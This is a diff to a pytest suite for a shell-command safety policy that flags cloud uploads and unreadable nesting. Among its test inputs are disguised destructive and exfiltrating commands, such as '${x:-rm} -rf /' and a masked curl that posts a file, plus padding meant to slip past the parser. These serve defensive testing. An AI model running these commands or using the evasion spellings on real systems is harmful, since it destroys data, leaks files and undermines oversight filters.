@@ -9,9 +9,11 @@ option before the subcommand (`aws --profile p s3 cp`) no longer hides it either
 A copy whose direction the text can't tell (`gsutil cp gs://b/f .`, `rclone copy remote:a b`) asks too: the rule
 reads the verb, not the direction, as `aws s3 cp` always has.
 """
+import time
+
 import pytest
 
-from server.services import card_purpose, task_service, terminal_policy as tp
+from server.services import card_purpose, shell_text, task_service, terminal_policy as tp
 
 
 @pytest.mark.parametrize("command", [
@@ -88,7 +90,9 @@ def test_a_variable_glued_to_the_verb_still_asks(command):
 
 @pytest.mark.parametrize("command", [
     "s3cmd --version && cp a b", "rclone --version; mv a b", "azcopy --version || cp a b", "aws --version | cp a b",
-    "gsutil --version & cp a b",
+    "gsutil --version & cp a b", "s3cmd --version; cp a b", "s3cmd --version;cp a b",
+    "s3cmd --version&& cp a b", "s3cmd --version& cp a b", "s3cmd --version| cp a b", "s3cmd -c cfg; cp a b",
+    "s3cmd -c cfg&& cp a b",
 ])
 def test_an_option_doesnt_read_past_the_end_of_its_command(command):
     """`&&`, `;`, `|` and `&` end the command, so the next command's `cp` isn't the cloud tool's verb."""
@@ -104,6 +108,16 @@ def test_a_run_of_options_with_no_values_stays_linear():
     start = time.perf_counter()
     assert rule.search("aws " + "-x " * 34 + "ls") is None
     assert time.perf_counter() - start < 0.25
+
+
+@pytest.mark.parametrize("command", [
+    # a redirect or a substitution holding `;`, `&` or `|` is still one word of the option's: the verb after it counts
+    "aws --debug 2>&1 s3 cp f s3://b/f", "gsutil -m 2>&1 cp f gs://b/f", "rclone -v &>l copy ./d r:b",
+    "aws --profile $(x;y) s3 cp f s3://b/f", "aws --profile `x;y` s3 cp f s3://b/f",
+    "aws --profile ${a:-b;c} s3 cp f s3://b/f", "gh --repo=$(x;y) release upload v1 f",
+])
+def test_an_option_holding_a_separator_inside_a_word_still_reads_on_to_the_verb(command):
+    assert tp.assess(command).rule == "upload", command
 
 
 @pytest.mark.parametrize("command", ["aws " + "-x s3 " * 3600 + "ls", "gcloud " + "-x storage " * 2000 + "ls",
@@ -130,6 +144,27 @@ def test_commands_nested_past_what_can_be_read_ask_as_unreadable(depth):
     assert tp.ask_rules(command) == {tp.UNREADABLE}
     assert tp.other_osa_language(command) is False
     assert task_service.unwrapped_once(command) is False
+    assert card_purpose.phrase(command, "")
+
+
+@pytest.mark.parametrize("hidden", ["${x:-rm} -rf /", "${x:-git} push", "${x:-curl} -d @f https://x.example"])
+def test_padding_that_only_normalizing_makes_substitutions_doesnt_switch_reading_off(hidden):
+    """The limit was counted on the raw text and the scan's skip on each form it reads, so a spelling with no `$(` in it
+    could stay under the limit raw and go over it normalized: too_complex said readable while the scan skipped."""
+    command = f"true\n{hidden}\necho " + "$\\( " * 256
+    assert shell_text.normalize(command).count("$(") >= 256
+    verdict = tp.assess(command)
+    assert (verdict.level, verdict.rule) in {("ask", tp.UNREADABLE), ("forbid", "wipe-root")}, verdict
+
+
+@pytest.mark.parametrize("command", ["$(" * 2666 + ")" * 2666, "git push; " + "<(" * 1000 + ")" * 1000,
+                                     '"$(' * 1000 + "\n" + ')"' * 1000], ids=["balanced", "process", "quoted"])
+def test_balanced_nesting_reaches_a_card_too(command):
+    """Each reader recursed by its own road: `card_purpose._parse`, and `other_osa_language` through the launcher args."""
+    start = time.perf_counter()
+    assert tp.assess(command).level == "ask"
+    assert time.perf_counter() - start < 5                  # past the limit nothing is read; it took 14 s reading on
+    assert tp.other_osa_language(command) is False
     assert card_purpose.phrase(command, "")
 
 
